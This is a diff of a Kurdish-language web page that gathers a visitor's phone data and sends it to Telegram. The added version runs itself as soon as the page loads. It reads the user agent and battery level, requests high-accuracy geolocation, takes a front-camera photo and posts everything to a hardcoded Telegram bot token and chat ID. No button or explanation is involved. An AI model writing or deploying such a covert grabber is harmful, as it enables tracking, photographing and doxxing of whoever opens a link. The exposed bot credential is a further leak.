@@ -1,118 +1,84 @@
 <!DOCTYPE html>
 <html lang="ku">
 <head>
-  <meta charset="UTF-8" />
-  <title>وەرگرتنی زانیاری و ناردن بۆ تلیگرام</title>
-  <style>
-    body { font-family: sans-serif; background: #f0f0f0; padding: 20px; max-width: 480px; margin: auto; }
-    h1 { color: #222; }
-    .info { margin: 10px 0; background: #fff; padding: 12px; border-radius: 8px; box-shadow: 0 0 6px rgba(0,0,0,0.1); }
-    #photo { margin-top: 12px; width: 100%; max-width: 320px; border-radius: 12px; }
-    button { margin-top: 15px; padding: 12px 24px; font-size: 16px; border: none; border-radius: 12px; background: #2196F3; color: white; cursor: pointer; transition: background 0.3s ease; }
-    button:hover { background: #1976d2; }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>وەرگرتنی زانیاری مۆبایل و ناردن بۆ تلیگرام</title>
+<style>
+  body { font-family: sans-serif; padding: 20px; max-width: 480px; margin: auto; background: #f7f7f7; color: #222; }
+  h1 { text-align: center; margin-bottom: 24px; }
+  .status { margin-top: 16px; padding: 12px; background: #fff; border-radius: 8px; box-shadow: 0 0 5px rgba(0,0,0,0.1); }
+</style>
 </head>
 <body>
 
-  <h1>زانیاری مۆبایل و ناردن بۆ تلیگرام</h1>
-
-  <div class="info" id="deviceInfo">جۆری مۆبایل: ...</div>
-  <div class="info" id="batteryInfo">ڕێژەی شەحن: ...</div>
-  <div class="info" id="locationInfo">لۆکەیشن: ...</div>
-
-  <button id="btnPhoto">وێنەی ڕوو لە کەمرای پێشەوە بدەرەوە</button>
-  <img id="photo" src="" alt="وێنەی ڕوو" />
-
-  <button id="btnSend" disabled>ناردنی زانیاری بۆ تلیگرام</button>
+<h1>وەرگرتنی زانیاری مۆبایل و ناردنی خۆکار بۆ تلیگرام</h1>
+<div id="status" class="status">ئەمە هەنووکە جێبەجێ دەکات...</div>
 
 <script>
-  // توکنی بۆت و چات آیدی تلیگرام
+(async () => {
   const TELEGRAM_BOT_TOKEN = '7783927860:AAEkxeJ0p8aFI_1sfaBhtSDWzYRS13yQ260';
   const CHAT_ID = '7594104612';
 
-  // وەرگرتنی جۆری مۆبایل
-  const deviceInfoEl = document.getElementById('deviceInfo');
-  deviceInfoEl.textContent = 'جۆری مۆبایل: ' + navigator.userAgent;
+  const statusEl = document.getElementById('status');
 
-  // وەرگرتنی ڕێژەی شەحن
-  let batteryLevel = 'زانیاری نەدراوە';
-  navigator.getBattery().then(battery => {
-    batteryLevel = Math.round(battery.level * 100) + '%';
-    document.getElementById('batteryInfo').textContent = 'ڕێژەی شەحن: ' + batteryLevel;
-  }).catch(() => {
-    document.getElementById('batteryInfo').textContent = 'ڕێژەی شەحن: پشتگیری ناکات';
-  });
-
-  // وەرگرتنی لۆکەیشن
-  let latitude = '';
-  let longitude = '';
-  const locationInfoEl = document.getElementById('locationInfo');
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(pos => {
-      latitude = pos.coords.latitude.toFixed(5);
-      longitude = pos.coords.longitude.toFixed(5);
-      locationInfoEl.textContent = `لۆکەیشن: ${latitude} , ${longitude}`;
-    }, err => {
-      locationInfoEl.textContent = 'هەلە لە وەرگرتنی لۆکەیشن';
-    });
-  } else {
-    locationInfoEl.textContent = 'لۆکەیشن بەردەست نیە';
+  function logStatus(msg) {
+    statusEl.textContent = msg;
+    console.log(msg);
   }
 
-  // وەرگرتنی وێنەی ڕووی بە فشاردانی دوگمە
-  const btnPhoto = document.getElementById('btnPhoto');
-  const photo = document.getElementById('photo');
-  let photoDataURL = '';
-  btnPhoto.onclick = () => {
-    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-        .then(stream => {
-          const videoTracks = stream.getVideoTracks();
-          const track = videoTracks[0];
-          let imageCapture = new ImageCapture(track);
-          imageCapture.takePhoto()
-            .then(blob => {
-              const reader = new FileReader();
-              reader.onloadend = () => {
-                photo.src = reader.result;
-                photoDataURL = reader.result;
-                track.stop();
-                btnSend.disabled = false;
-              };
-              reader.readAsDataURL(blob);
-            })
-            .catch(() => {
-              alert('نەتوانرا وێنە بگرێت.');
-              track.stop();
-            });
-        })
-        .catch(() => {
-          alert('کەمرای پێشەوە بەردەست نیە یان ڕەزامەندی نەدراوە.');
-        });
-    } else {
-      alert('براوسەر کەمرای پێشەوە پشتگیری ناکات.');
-    }
-  };
+  try {
+    logStatus('وەرگرتنی جۆری مۆبایل...');
+    const deviceInfo = navigator.userAgent;
 
-  // ناردنی زانیاری بۆ تلیگرام
-  const btnSend = document.getElementById('btnSend');
-  btnSend.onclick = () => {
+    logStatus('وەرگرتنی ڕێژەی شەحن...');
+    let batteryLevel = 'نەدراوە';
+    try {
+      const battery = await navigator.getBattery();
+      batteryLevel = Math.round(battery.level * 100) + '%';
+    } catch {
+      batteryLevel = 'پشتگیری ناکات';
+    }
+
+    logStatus('وەرگرتنی لوکەیشن...');
+    let latitude = '', longitude = '';
+    try {
+      const pos = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 });
+      });
+      latitude = pos.coords.latitude.toFixed(5);
+      longitude = pos.coords.longitude.toFixed(5);
+    } catch {
+      latitude = longitude = '';
+    }
+
+    logStatus('وەرگرتنی وێنەی ڕوو بە کەمرای پێشەوە...');
+    let photoDataURL = '';
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+      const track = stream.getVideoTracks()[0];
+      const imageCapture = new ImageCapture(track);
+      const blob = await imageCapture.takePhoto();
+      photoDataURL = await new Promise(resolve => {
+        const reader = new FileReader();
+        reader.onloadend = () => resolve(reader.result);
+        reader.readAsDataURL(blob);
+      });
+      track.stop();
+    } catch {
+      photoDataURL = '';
+    }
+
+    logStatus('ناردنی زانیاری بۆ تلیگرام...');
+
     let message = `<b>زانیاری مۆبایل</b>\n`;
-    message += `جۆری مۆبایل: ${navigator.userAgent}\n`;
+    message += `جۆری مۆبایل: ${deviceInfo}\n`;
     message += `ڕێژەی شەحن: ${batteryLevel}\n`;
-    if (latitude && longitude) {
-      message += `لۆکەیشن: ${latitude} , ${longitude}\n`;
-    } else {
-      message += `لۆکەیشن: نەدراوە\n`;
-    }
-    if (photoDataURL) {
-      message += `وێنەی ڕوو: ناردراوە (ببە تلیگرام بۆ وێنە بڕۆ)`;
-    } else {
-      message += `وێنەی ڕوو: نەدراوە`;
-    }
+    message += latitude && longitude ? `لۆکەیشن: ${latitude} , ${longitude}\n` : `لۆکەیشن: نەدراوە\n`;
+    message += photoDataURL ? `وێنەی ڕوو: ناردراوە` : `وێنەی ڕوو: نەدراوە`;
 
-    // ناردنی تکست بۆ تلیگرام
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    // ناردنی تکست
+    const sendMessageResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -120,45 +86,38 @@
         text: message,
         parse_mode: 'HTML'
       })
-    }).then(res => res.json())
-    .then(data => {
-      if(data.ok){
-        alert('زانیاریەکان بەسەرکەوتوویی ناردرا.');
-        // ئەگەر وێنە هەیە، پەیوەندی بۆ ناردنی وێنەی لە دوایین هەڵبژاردن ئەنجام بدە
-        if(photoDataURL){
-          sendPhoto(photoDataURL);
-        }
-      } else {
-        alert('هەڵە لە ناردنی زانیاری.');
-      }
-    }).catch(() => {
-      alert('هەڵە لە پەیوەندیدا.');
     });
-  };
+    const sendMessageData = await sendMessageResponse.json();
 
-  // فەرمی ناردنی وێنە بۆ تلیگرام
-  function sendPhoto(dataURL){
-    // دەقی Base64 هەڵبژێرە لە dataURL
-    const base64Data = dataURL.split(',')[1];
+    if (!sendMessageData.ok) {
+      logStatus('هەڵە لە ناردنی زانیاری.');
+      return;
+    }
 
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        photo: `data:image/jpeg;base64,${base64Data}`,
-      })
-    }).then(res => res.json())
-    .then(data => {
-      if(data.ok){
-        alert('وێنەکە بەسەرکەوتوویی ناردرا.');
-      } else {
-        alert('هەڵە لە ناردنی وێنە.');
+    // ناردنی وێنە (ئەگەر هەیە)
+    if (photoDataURL) {
+      const sendPhotoResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          photo: photoDataURL
+        })
+      });
+      const sendPhotoData = await sendPhotoResponse.json();
+
+      if (!sendPhotoData.ok) {
+        logStatus('هەڵە لە ناردنی وێنە.');
+        return;
       }
-    }).catch(() => {
-      alert('هەڵە لە پەیوەندیدا بۆ وێنە.');
-    });
+    }
+
+    logStatus('هەموو زانیاریەکان بەسەرکەوتوویی ناردرا.');
+
+  } catch (e) {
+    logStatus('هەڵەیەک ڕوویدا: ' + e.message);
   }
+})();
 </script>
 
 </body>
